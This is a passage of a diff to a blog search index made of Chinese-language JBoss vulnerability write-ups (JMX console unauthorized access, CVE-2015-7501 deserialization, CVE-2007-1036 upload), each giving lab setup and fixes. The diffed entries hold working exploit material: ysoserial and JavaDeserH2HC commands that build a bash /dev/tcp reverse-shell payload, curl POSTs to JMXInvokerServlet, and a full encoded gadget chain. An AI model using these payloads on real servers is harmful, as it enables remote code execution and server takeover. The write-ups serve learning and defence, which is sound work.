class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li><p>删除<code>http-invoker.sar</code>组件</p>
-</li>
-<li><p>设置<code>http-invoker</code></p>
- <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>升级JBoss版本</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web服务器漏洞</category>
-        <category>常规漏洞</category>
-        <category>JBoss</category>
-        <category>反序列化漏洞</category>
-      </categories>
-      <tags>
-        <tag>反序列化漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss JMX Console未授权访问漏洞</title>
-    <url>//8e92a3ee39a7.html</url>
-    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
-<p>默认端口：8080</p>
-<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
-<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
-<p>全版本</p>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
-<p>在官网下载相应的JBoss版本</p>
-<p>配置环境变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
-
-<p>外网访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
-<ol>
-<li>JBoss漏洞检测工具下载</li>
-</ol>
-<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
-<ol start="2">
-<li>先探测是否具有JBoss服务</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
-
-<p>根据HTTP头部</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
-
-
-
-<p>访问如下地址</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor</span><br></pre></td></tr></table></figure>
-
-<p>如果可以成功访问，证明存在此漏洞</p>
-<p>该页面为JBoss控制台，暴漏在公网存在多处漏洞</p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
-</ol>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
-<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web服务器漏洞</category>
-        <category>常规漏洞</category>
-        <category>JBoss</category>
-        <category>未授权访问漏洞</category>
-      </categories>
-      <tags>
-        <tag>未授权访问漏洞</tag>
-        <tag>访问控制错误漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JBoss JMX控制台安全验证绕过漏洞 - CVE-2010-0738</title>
     <url>//3a334b8ad7cb.html</url>
     <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
@@ -5949,86 +6066,6 @@
       </categories>
       <tags>
         <tag>访问控制错误漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss JMXInvokerServlet 反序列化漏洞 - CVE-2015-7501</title>
-    <url>//7ce29cf4d767.html</url>
-    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
-<p>默认端口：8080</p>
-<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss在 <code>/invoker/JMXInvokerServlet</code> 请求中读取了用户传入的对象，然后我们可以利用 <code>Apache Commons Collections</code> 中的 <code>Gadget</code> 执行任意代码。</p>
-<p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：3.2.4~4.0.5</p>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
-<p>在官网下载相应的JBoss版本</p>
-<p>配置环境变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
-
-<p>外网访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
-<ol>
-<li>JBoss漏洞检测工具下载</li>
-</ol>
-<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
-<ol start="2">
-<li>先探测是否具有JBoss服务</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
-
-<p>根据HTTP头部</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
-
-
-
-<p>访问如下地址</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure>
-
-<p>如果提示下载信息，则说明存在此漏洞</p>
-<p>监听端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
-
-<p>下载JavaDeserH2HC工具</p>
-<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以使用<code>ysoserial.jar</code>工具</p>
-<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>
-
-<p>HTTP头部抓包</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/JMXInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li><p>删除<code>http-invoker.sar</code>组件</p>
-</li>
-<li><p>设置<code>http-invoker</code></p>
- <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>升级JBoss版本</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web服务器漏洞</category>
-        <category>常规漏洞</category>
-        <category>JBoss</category>
-        <category>反序列化漏洞</category>
-      </categories>
-      <tags>
-        <tag>反序列化漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -6163,11 +6200,92 @@
         <category>漏洞利用</category>
         <category>Web服务器漏洞</category>
         <category>常规漏洞</category>
-        <category>JBoss</category>
         <category>注入漏洞</category>
+        <category>JBoss</category>
       </categories>
       <tags>
         <tag>注入漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss后台文件上传漏洞 - CVE-2007-1036</title>
+    <url>//013bc4e5df03.html</url>
+    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>默认端口：8080</p>
+<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
+<p>全版本</p>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
+<p>在官网下载相应的JBoss版本</p>
+<p>配置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
+
+<p>外网访问</p>
